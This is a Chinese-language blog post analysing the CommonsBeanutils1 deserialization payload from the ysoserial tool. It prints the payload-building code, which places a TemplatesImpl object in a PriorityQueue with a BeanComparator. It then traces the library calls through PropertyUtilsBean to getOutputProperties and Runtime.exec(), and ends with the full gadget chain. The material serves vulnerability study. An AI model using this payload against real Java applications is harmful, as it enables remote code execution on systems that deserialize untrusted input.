---
title: Ysoserial工具解读（五）
date: 2019-11-05 10:39:59
tags: [Java, RCE,反序列化]
categories: 漏洞分析
cover: java_cover.png
---

这篇博客介绍CommonsBeanutils1的构造方式，相比于之前分析过的其他Payload。这次利用的`beanutils.BeanComparator`、`beanutils.PropertyUtils`类的调用链更长，但最终又会回到之前介绍过的调用链上。

<!-- more -->

## CommonsBeanutils1的Payload构造方式

```java
/*	先贴小段代码：
*/

public Object getObject(final String command) throws Exception {
    final Object templates = Gadgets.createTemplatesImpl(command);

    // 其他都是操作，只不过这里将TransformingComparator类换成了BeanComparator类
    // mock method name until armed
    final BeanComparator comparator = new BeanComparator("lowestSetBit");

    // create queue with numbers and basic comparator
    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
    // stub data for replacement later
    queue.add(new BigInteger("1"));
    queue.add(new BigInteger("1"));

    // switch method called by comparator
    // 将BeanComparator实例的property字段改为"outputProperties"，方便后期调用outputProperties()方法
    Reflections.setFieldValue(comparator, "property", "outputProperties");

    // switch contents of queue
    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
    queueArray[0] = templates;
    queueArray[1] = templates;

    return queue;
}
```

前面的套路都是一样的，在反序列化时经历`PriorityQueue.readObject() -> heapify() -> siftDown() -> siftDownUsingComparator() -> BeanComparator.compare()`。所以，接下里分析下`BeanComparator`类：

### `BeanComparator`类

```java
// 构造函数1
public BeanComparator( String property ) {
    this( property, ComparableComparator.getInstance() );
}

// 构造函数2
public BeanComparator( String property, Comparator<?> comparator ) {
    setProperty( property );
    if (comparator != null) {
        this.comparator = comparator;
    } else {
        this.comparator = ComparableComparator.getInstance();
    }
}

// 实际上利用时只用到了property字段
public void setProperty( String property ) {
    this.property = property;
}

public int compare( T o1, T o2 ) {

    if ( property == null ) {
        // compare the actual objects
        return internalCompare( o1, o2 );
    }

    try {
        // 两个T类对象o1、o2都是TemplatesImpl类的恶意对象
        // 参数o1为TemplatesImpl、参数property为"outputProperties"
        Object value1 = PropertyUtils.getProperty( o1, property );
		* * * * 
}
```

再来看看`PropertyUtils`类中对应的方法：

```java
/*	PropertyUtils.java
*/
public static Object getProperty(Object bean, String name)
    throws IllegalAccessException, InvocationTargetException,
NoSuchMethodException {
    // PropertyUtilsBean.getInstance()是个静态方法，根据线程的上下文环境中的ClassLoader返回一个PropertyUtilsBean实例。这里的主要调用在getProperty()方法中。
    return (PropertyUtilsBean.getInstance().getProperty(bean, name));
}
```

### `PropertyUtilsBean`类

```java
/*	PropertyUtilsBean.java
*/
protected static PropertyUtilsBean getInstance() {
    return BeanUtilsBean.getInstance().getPropertyUtils();
}

// 参数bean为TemplatesImpl、参数name为"outputProperties"
public Object getProperty(Object bean, String name)
    throws IllegalAccessException, InvocationTargetException,
NoSuchMethodException {
    return (getNestedProperty(bean, name));
}

public Object getNestedProperty(Object bean, String name)
    throws IllegalAccessException, InvocationTargetException,
NoSuchMethodException {
	* * * *

    // Resolve nested references
    while (resolver.hasNested(name)) {
		* * * *
    }

    if (bean instanceof Map) {
        bean = getPropertyOfMapBean((Map<?, ?>) bean, name);
    } else if (resolver.isMapped(name)) {
     	* * * *
    } else {
        bean = getSimpleProperty(bean, name);
    }
    return bean;
}

public Object getSimpleProperty(Object bean, String name)
    throws IllegalAccessException, InvocationTargetException,
NoSuchMethodException {

	* * * *

    // Retrieve the property getter method for the specified property
    PropertyDescriptor descriptor =
        getPropertyDescriptor(bean, name);
    if (descriptor == null) {
        throw new NoSuchMethodException("Unknown property '" +
                                        name + "' on class '" + bean.getClass() + "'" );
    }
    // 利用反射机制根据name从bean中读取对应属性的读方法，这里就是TemplatesImpl.outputProperties()方法
    Method readMethod = getReadMethod(bean.getClass(), descriptor);
    if (readMethod == null) {
        throw new NoSuchMethodException("Property '" + name +
                                        "' has no getter method in class '" + bean.getClass() + "'");
    }

    // Call the property getter and return the value
    Object value = invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);
    return (value);
}

private Object invokeMethod(
    Method method,
    Object bean,
    Object[] values)
    throws
    IllegalAccessException,
InvocationTargetException {
    if(bean == null) {
        throw new IllegalArgumentException("No bean specified " +
                                           "- this should have been checked before reaching this method");
    }

    try {
    	// 在这里调用TemplatesImpl.outputProperties()方法
        return method.invoke(bean, values);

    } catch (NullPointerException cause) {
        * * * *
    }
}
```

这样，调用链在这里又回到了`TemplatesImpl`类对象中：

```java
/*	TemplatesImpl.java
*/
public synchronized Properties getOutputProperties() {
    try {
        // newTransformer()方法之前分析过，就是触发利用链的入口方法
        return newTransformer().getOutputProperties();
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```

接下来的调用步骤就很熟悉了：`TemplatesImpl.newTransformer()->getTransletInstance()->Class.newInstance()->---Method.invoke()->Runtime.exec()`

## 完整构造链

整理一下，完整的调用过程如下：

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				PriorityQueue.heapify()
					PriorityQueue.siftDown()
						PriorityQueue.siftDownUsingComparator()
				...
					BeanComparator.compare()
				...
					PropertyUtils.getProperty()
				...
					PropertyUtilsBean.getProperty()
						PropertyUtilsBean.getNestedProperty()
							PropertyUtilsBean.getSimpleProperty()
								PropertyUtilsBean.invokeMethod()
				...
								TemplatesImpl.newTransformer()
									TemplatesImpl.getTransletInstance()
										Class.newInstance()
				... 										
									Method.invoke()
										Runtime.exec()

*/
```

